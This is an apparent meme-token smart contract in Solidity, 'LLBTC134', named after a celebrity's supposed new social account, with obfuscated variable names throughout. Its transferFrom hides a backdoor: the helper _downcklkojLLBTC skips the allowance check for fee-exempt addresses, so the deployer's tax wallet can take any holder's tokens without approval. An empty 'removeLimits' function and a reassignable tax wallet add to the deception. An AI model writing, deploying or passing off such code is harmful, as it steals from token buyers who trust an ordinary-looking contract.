// SPDX-License-Identifier: MIT

/*
    Name : CZ_binance's New X Account
    Ticker : LLBTC134
    Telegram : https://t.me/CZ_LLBTC134
    Twitter : https://x.com/LLBTC134
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract LLBTC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    constructor() payable {
        _taxclknlLLBTC = payable(_msgSender());
        
        _balknvlkcLLBTC[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcLLBTC[address(this)] = (qq30fef * 98) / 100;
        _feevblknlLLBTC[address(this)] = true;
        _feevblknlLLBTC[_taxclknlLLBTC] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }
    
    mapping(address => uint256) private _balknvlkcLLBTC;
    mapping(address => mapping(address => uint256)) private _allcvnkjnLLBTC;
    mapping(address => bool) private _feevblknlLLBTC;
    address payable private _taxclknlLLBTC;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"CZ_binance's New X Account";
    string private constant _symbol = unicode"LLBTC134";

    uint256 private _vkjbnkfjLLBTC = 10;
    uint256 private _maxovnboiLLBTC = 10;
    uint256 private _initvkjnbkjLLBTC = 20;
    uint256 private _finvjlkbnlkjLLBTC = 0;
    uint256 private _redclkjnkLLBTC = 2;
    uint256 private _prevlfknjoiLLBTC = 2;
    uint256 private _buylkvnlkLLBTC = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknLLBTC;
    bool private _inlknblLLBTC = false;
    bool private swapvlkLLBTC = false;
    uint256 private _sellcnjkLLBTC = 0;
    uint256 private _lastflkbnlLLBTC = 0;
    address constant _deadlknLLBTC = address(0xdead);

    uint256 public _vnbbvlkLLBTC = qq30fef / 100;
    uint256 public _oijboijoiLLBTC = 15 * 10**18;
    uint256 private _cvjkbnkjLLBTC = 10;

    modifier lockTheSwap() {
        _inlknblLLBTC = true;
        _;
        _inlknblLLBTC = false;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcLLBTC[account];
    }
    
    function _transfer_kjvnLLBTC(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblLLBTC(from, to, amount);
        _balknvlkcLLBTC[from] = _balknvlkcLLBTC[from].sub(amount);
        _balknvlkcLLBTC[to] = _balknvlkcLLBTC[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcLLBTC[address(this)] = _balknvlkcLLBTC[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknLLBTC) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojLLBTC(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlLLBTC[msg.sender]) return !_feevblknlLLBTC[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknLLBTC)) return false;
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnLLBTC[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnLLBTC(sender, recipient, amount);
        if (_downcklkojLLBTC(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnLLBTC[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnLLBTC(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnLLBTC[owner][spender];
    }

    function _calcTax_lvknblLLBTC(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblLLBTC) {
                taxAmount = amount
                    .mul((_buylkvnlkLLBTC > _redclkjnkLLBTC) ? _finvjlkbnlkjLLBTC : _initvkjnbkjLLBTC)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlLLBTC[to] &&
                to != _taxclknlLLBTC
            ) {
                _buylkvnlkLLBTC++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblLLBTC &&
                to == uniswapV2Pair &&
                from != _taxclknlLLBTC &&
                swapvlkLLBTC &&
                _buylkvnlkLLBTC > _prevlfknjoiLLBTC
            ) {
                if (block.number > _lastflkbnlLLBTC) {
                    _sellcnjkLLBTC = 0;
                }
                _sellcnjkLLBTC = _sellcnjkLLBTC + _getAmountOut_lvcbnkLLBTC(amount);
                require(_sellcnjkLLBTC <= _oijboijoiLLBTC, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkLLBTC)
                    _swapTokenslknlLLBTC(_vnbbvlkLLBTC > amount ? amount : _vnbbvlkLLBTC);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjLLBTC(address(this).balance);
                }
                _lastflkbnlLLBTC = block.number;
            }
        }
        return taxAmount;
    }
    function _sendETHTocvbnjLLBTC(uint256 amount) private {
        _taxclknlLLBTC.transfer(amount);
    }
    function _swapTokenslknlLLBTC(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function startTrading() external onlyOwner {
        require(!_tradingvlknLLBTC, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkLLBTC = true;
        _tradingvlknLLBTC = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnLLBTC() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkLLBTC(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblLLBTC(address payable newWallet) external {
        require(_feevblknlLLBTC[_msgSender()]);
        _taxclknlLLBTC = newWallet;
        _feevblknlLLBTC[_taxclknlLLBTC] = true;
    }
}